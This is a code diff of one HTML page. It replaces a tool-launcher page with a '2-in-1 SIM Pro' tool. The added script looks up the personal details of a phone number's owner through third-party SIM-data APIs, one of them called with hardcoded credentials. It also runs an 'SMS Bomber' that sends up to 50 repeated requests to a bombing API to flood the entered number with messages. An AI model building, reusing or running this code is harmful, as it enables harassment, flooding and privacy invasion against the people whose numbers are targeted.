@@ -1,143 +1,423 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AHMAR RDX · ToolVault</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:#0c0c16;color:#eee;font-family:'Segoe UI',sans-serif;padding:20px;}
-    .brand{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;}
-    .brand h1{font-size:1.8rem;background:linear-gradient(135deg,#ff4757,#ff6b81);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
-    .controls{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px;}
-    input,textarea,button{outline:none;border:none;padding:10px 15px;border-radius:8px;font-family:inherit;}
-    input,textarea{background:#1a1a2e;color:#fff;border:1px solid #333;width:200px;}
-    textarea{width:300px;height:60px;resize:none;}
-    button{background:#ff4757;color:#fff;font-weight:bold;cursor:pointer;transition:.2s;}
-    button:hover{background:#ff6b81;}
-    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:15px;}
-    .card{background:#14141f;padding:15px;border-radius:10px;border:1px solid #2a2a3a;cursor:pointer;transition:.2s;}
-    .card:hover{border-color:#ff4757;}
-    .card h3{font-size:1rem;margin-bottom:8px;}
-    .card pre{background:#0a0a14;padding:8px;border-radius:5px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;font-size:.7rem;color:#aaa;}
-    .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:none;align-items:center;justify-content:center;z-index:100;}
-    .modal.active{display:flex;}
-    .modal-box{background:#1a1a28;padding:20px;border-radius:12px;width:95%;max-width:800px;max-height:80vh;overflow:auto;}
-    .modal-box iframe{width:100%;height:70vh;border:none;}
-    .close{position:absolute;top:10px;right:20px;font-size:1.5rem;cursor:pointer;color:#fff;}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2-in-1 SIM Tools | Premium</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0a0f;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated background particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .particle {
+            position: absolute;
+            background: rgba(0, 255, 255, 0.3);
+            border-radius: 50%;
+            animation: float 15s infinite;
+            filter: blur(2px);
+        }
+        @keyframes float {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+        }
+
+        /* Glass container */
+        .glass-container {
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 550px;
+            background: rgba(20, 20, 35, 0.7);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 2.5rem;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8), inset 0 0 0 1px rgba(255,255,255,0.05);
+            animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Title */
+        .title {
+            font-size: 2.2rem;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 1.8rem;
+            background: linear-gradient(135deg, #00f2fe, #4facfe, #ff6ec7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+            text-shadow: 0 0 30px rgba(0, 242, 254, 0.3);
+        }
+
+        /* Input field */
+        .input-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+        .input-field {
+            flex: 1 1 70%;
+            padding: 1rem 1.5rem;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1.5px solid rgba(255, 255, 255, 0.15);
+            border-radius: 1.2rem;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s;
+            backdrop-filter: blur(5px);
+        }
+        .input-field:focus {
+            border-color: #00f2fe;
+            box-shadow: 0 0 25px rgba(0, 242, 254, 0.3);
+        }
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.45);
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 1rem 1.8rem;
+            border: none;
+            border-radius: 1.2rem;
+            font-weight: 700;
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            text-transform: uppercase;
+            backdrop-filter: blur(12px);
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-sim {
+            background: linear-gradient(135deg, #00f2fe, #4facfe);
+            color: #0a0a0f;
+            flex: 1;
+            box-shadow: 0 10px 25px -5px rgba(0, 242, 254, 0.4);
+        }
+        .btn-bomber {
+            background: linear-gradient(135deg, #ff6ec7, #fc4a8d);
+            color: white;
+            flex: 1;
+            box-shadow: 0 10px 25px -5px rgba(255, 110, 199, 0.4);
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            filter: brightness(1.15);
+        }
+        .btn:active {
+            transform: translateY(0px);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            pointer-events: none;
+            filter: grayscale(20%);
+        }
+
+        /* Bomber count input */
+        .bomber-options {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.2rem;
+            flex-wrap: wrap;
+        }
+        .count-input {
+            width: 80px;
+            padding: 0.7rem 1rem;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1.5px solid rgba(255, 255, 255, 0.2);
+            border-radius: 1rem;
+            color: white;
+            text-align: center;
+            font-weight: bold;
+            outline: none;
+        }
+
+        /* Results cards */
+        .results {
+            margin-top: 1.8rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+        }
+        .result-card {
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            animation: fadeIn 0.5s;
+            box-shadow: 0 10px 30px -10px rgba(0,0,0,0.6);
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .result-title {
+            font-weight: 700;
+            font-size: 1rem;
+            color: #00f2fe;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            padding-bottom: 0.5rem;
+        }
+        .result-content {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            white-space: pre-wrap;
+            color: #ddd;
+            line-height: 1.6;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top-color: #00f2fe;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Progress bar (for bomber) */
+        .progress-bar {
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            margin: 1rem 0 0.5rem;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff6ec7, #fc4a8d);
+            transition: width 0.2s;
+            border-radius: 10px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 500px) {
+            .glass-container {
+                padding: 2rem 1.2rem;
+            }
+            .btn {
+                padding: 0.9rem 1rem;
+                font-size: 0.8rem;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="brand">
-    <h1>⚡ AHMAR RDX TOOLS</h1>
-    <span style="color:#888;">Your own tool collection</span>
-  </div>
+    <!-- Particle background -->
+    <div class="particles" id="particles"></div>
 
-  <div class="controls">
-    <input type="text" id="toolName" placeholder="Tool name...">
-    <textarea id="toolCode" placeholder="Paste full HTML here..."></textarea>
-    <button onclick="addTool()">➕ Add Tool</button>
-    <button onclick="exportTools()" style="background:#333;">📤 Export</button>
-    <label style="background:#1a1a2e;padding:8px 15px;border-radius:8px;cursor:pointer;color:#fff;">
-      📥 Import <input type="file" id="importFile" accept=".json" hidden onchange="importTools(event)">
-    </label>
-  </div>
+    <div class="glass-container">
+        <h1 class="title">⚡ 2‑in‑1 SIM Pro</h1>
 
-  <div class="grid" id="toolGrid"></div>
-
-  <!-- Run modal -->
-  <div class="modal" id="runModal">
-    <div class="modal-box">
-      <span class="close" onclick="closeRun()">&times;</span>
-      <h3 id="runTitle"></h3>
-      <iframe id="runFrame" sandbox="allow-scripts allow-forms allow-popups allow-same-origin"></iframe>
-    </div>
-  </div>
-
-  <script>
-    const STORAGE = 'ahmar_tools';
-    let tools = JSON.parse(localStorage.getItem(STORAGE)) || [
-      { id: '1', name: '🎨 Color Picker', code: '<!DOCTYPE html><html><head><style>body{font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;background:#0c0c16;color:#fff;}input[type=color]{width:80px;height:80px;border:none;border-radius:10px;}.info{background:#1a1a2e;padding:20px;border-radius:10px;margin-top:20px;}</style></head><body><h2>AHMAR RDX</h2><input type="color" id="c" value="#ff4757"><div class="info">HEX: <span id="h">#ff4757</span></div><script>c.oninput=()=>h.textContent=c.value;<\/script></body></html>', time: Date.now() }
-    ];
-
-    function save() { localStorage.setItem(STORAGE, JSON.stringify(tools)); }
-    function render() {
-      const grid = document.getElementById('toolGrid');
-      grid.innerHTML = tools.map(t => `
-        <div class="card" onclick="run('${t.id}')">
-          <h3>${t.name}</h3>
-          <pre>${t.code.replace(/<[^>]*>/g,'').substring(0,50)}...</pre>
-          <div style="display:flex;gap:6px;margin-top:8px;">
-            <button style="font-size:.7rem;padding:4px 10px;" onclick="event.stopPropagation();editTool('${t.id}')">✏️</button>
-            <button style="font-size:.7rem;padding:4px 10px;background:#e74c3c;" onclick="event.stopPropagation();deleteTool('${t.id}')">🗑️</button>
-          </div>
+        <div class="input-group">
+            <input type="text" class="input-field" id="phoneInput" placeholder="Enter phone number (e.g., 03XXXXXXXXX)" value="">
         </div>
-      `).join('');
-    }
 
-    window.addTool = function() {
-      const name = document.getElementById('toolName').value.trim();
-      const code = document.getElementById('toolCode').value.trim();
-      if(!name || !code) return alert('Please fill both fields.');
-      tools.unshift({ id: Date.now().toString(), name, code, time: Date.now() });
-      save(); render();
-      document.getElementById('toolName').value = '';
-      document.getElementById('toolCode').value = '';
-    };
+        <!-- SIM Details button -->
+        <div style="display: flex; gap: 1rem; margin-bottom: 1.5rem;">
+            <button class="btn btn-sim" id="simBtn" onclick="fetchSimDetails()">
+                <span>🔍</span> SIM Details
+            </button>
+            <button class="btn btn-bomber" id="bomberBtn" onclick="startBombing()">
+                <span>💣</span> SMS Bomber
+            </button>
+        </div>
 
-    window.editTool = function(id) {
-      const tool = tools.find(t => t.id === id);
-      if(!tool) return;
-      document.getElementById('toolName').value = tool.name;
-      document.getElementById('toolCode').value = tool.code;
-      tools = tools.filter(t => t.id !== id); // remove and re-add after edit
-      save(); render();
-    };
+        <!-- Bomber options (hidden initially) -->
+        <div id="bomberPanel" class="bomber-options hidden">
+            <span style="color: #ccc; font-size: 0.9rem;">Count:</span>
+            <input type="number" class="count-input" id="bombCount" value="5" min="1" max="50">
+            <span style="color: #888; font-size: 0.8rem;">(max 50)</span>
+        </div>
 
-    window.deleteTool = function(id) {
-      if(!confirm('Delete?')) return;
-      tools = tools.filter(t => t.id !== id);
-      save(); render();
-    };
+        <!-- Progress for bomber -->
+        <div id="progressContainer" class="hidden">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div style="text-align: right; color: #aaa; font-size: 0.8rem;" id="progressText">0/5</div>
+        </div>
 
-    window.run = function(id) {
-      const tool = tools.find(t => t.id === id);
-      if(!tool) return;
-      document.getElementById('runTitle').textContent = '▶️ ' + tool.name;
-      document.getElementById('runFrame').srcdoc = tool.code;
-      document.getElementById('runModal').classList.add('active');
-    };
+        <!-- Results area -->
+        <div class="results" id="resultsArea"></div>
+    </div>
 
-    window.closeRun = function() {
-      document.getElementById('runModal').classList.remove('active');
-      document.getElementById('runFrame').srcdoc = '';
-    };
+    <script>
+        // Generate floating particles
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 35; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            const size = Math.random() * 6 + 2;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = (Math.random() * 20 + 10) + 's';
+            particle.style.animationDelay = Math.random() * 10 + 's';
+            particle.style.background = `hsl(${Math.random() * 60 + 180}, 80%, 70%)`;
+            particlesContainer.appendChild(particle);
+        }
 
-    window.exportTools = function() {
-      const blob = new Blob([JSON.stringify(tools)], {type:'application/json'});
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = 'ahmar-rdx-tools.json';
-      a.click();
-    };
+        // Toggle bomber panel when bomber button gains focus
+        document.getElementById('bomberBtn').addEventListener('click', function() {
+            document.getElementById('bomberPanel').classList.remove('hidden');
+            document.getElementById('progressContainer').classList.add('hidden');
+        });
 
-    window.importTools = function(e) {
-      const file = e.target.files[0];
-      if(!file) return;
-      const reader = new FileReader();
-      reader.onload = ev => {
-        try {
-          const data = JSON.parse(ev.target.result);
-          data.forEach(t => { if(!tools.find(x=>x.name===t.name && x.code===t.code)) tools.unshift({...t, id:Date.now().toString()}); });
-          save(); render();
-        } catch{ alert('Invalid file'); }
-      };
-      reader.readAsText(file);
-      e.target.value = '';
-    };
+        async function fetchSimDetails() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) return alert('Please enter a phone number.');
 
-    // initial
-    render();
-  </script>
+            const resultsDiv = document.getElementById('resultsArea');
+            resultsDiv.innerHTML = `<div style="text-align:center"><span class="spinner"></span> Fetching SIM details...</div>`;
+
+            const api1Url = `https://blacksimdetail.vercel.app/public_apis/simdetailsapi.php?number=${phone}`;
+            const api3Url = `https://app.findpakjobs.pk/api.php?username=wduser1&password=112233&number=${phone}`;
+
+            try {
+                const [res1, res3] = await Promise.allSettled([
+                    fetch(api1Url).then(r => r.text()),
+                    fetch(api3Url).then(r => r.text())
+                ]);
+
+                let content = '';
+
+                // Process API 1
+                if (res1.status === 'fulfilled') {
+                    content += `<div class="result-card">
+                        <div class="result-title">📡 BlackSIM Details</div>
+                        <div class="result-content">${escapeHtml(res1.value) || 'No data'}</div>
+                    </div>`;
+                } else {
+                    content += `<div class="result-card">
+                        <div class="result-title">📡 BlackSIM Details</div>
+                        <div class="result-content" style="color: #ff6b6b;">❌ Failed to fetch (CORS may be blocked)</div>
+                    </div>`;
+                }
+
+                // Process API 3
+                if (res3.status === 'fulfilled') {
+                    content += `<div class="result-card">
+                        <div class="result-title">🗂️ FindPakJobs Details</div>
+                        <div class="result-content">${escapeHtml(res3.value) || 'No data'}</div>
+                    </div>`;
+                } else {
+                    content += `<div class="result-card">
+                        <div class="result-title">🗂️ FindPakJobs Details</div>
+                        <div class="result-content" style="color: #ff6b6b;">❌ Failed to fetch (CORS may be blocked)</div>
+                    </div>`;
+                }
+
+                resultsDiv.innerHTML = content;
+            } catch (e) {
+                resultsDiv.innerHTML = `<div style="color: #ff6b6b; text-align:center;">Unexpected error: ${e.message}</div>`;
+            }
+        }
+
+        async function startBombing() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) return alert('Please enter a phone number.');
+
+            const count = parseInt(document.getElementById('bombCount').value) || 5;
+            if (count < 1 || count > 50) return alert('Count must be between 1 and 50.');
+
+            const resultsDiv = document.getElementById('resultsArea');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            const bomberBtn = document.getElementById('bomberBtn');
+            const simBtn = document.getElementById('simBtn');
+
+            // Disable buttons
+            bomberBtn.disabled = true;
+            simBtn.disabled = true;
+            progressContainer.classList.remove('hidden');
+            resultsDiv.innerHTML = '';
+
+            const api2Url = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${phone}`;
+
+            for (let i = 1; i <= count; i++) {
+                try {
+                    const response = await fetch(api2Url);
+                    const text = await response.text();
+                    // Show minimal feedback for each request
+                    resultsDiv.innerHTML += `<div style="font-size:0.8rem; color:#aaa;">💥 Bomb ${i}/${count} – ${text.substring(0, 30) || 'sent'}</div>`;
+                } catch (e) {
+                    resultsDiv.innerHTML += `<div style="font-size:0.8rem; color:#ff6b6b;">❌ Bomb ${i}/${count} failed</div>`;
+                }
+
+                const percent = (i / count) * 100;
+                progressFill.style.width = percent + '%';
+                progressText.textContent = `${i}/${count}`;
+
+                // Small delay to avoid rate limiting
+                if (i < count) await new Promise(r => setTimeout(r, 800));
+            }
+
+            // Re-enable buttons
+            bomberBtn.disabled = false;
+            simBtn.disabled = false;
+            resultsDiv.innerHTML += `<div style="color:#00f2fe; margin-top:1rem; font-weight:bold;">✅ Bombing completed (${count} attempts)</div>`;
+            setTimeout(() => {
+                progressContainer.classList.add('hidden');
+            }, 2000);
+        }
+
+        function escapeHtml(text) {
+            if (!text) return '';
+            return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        }
+    </script>
 </body>
 </html>
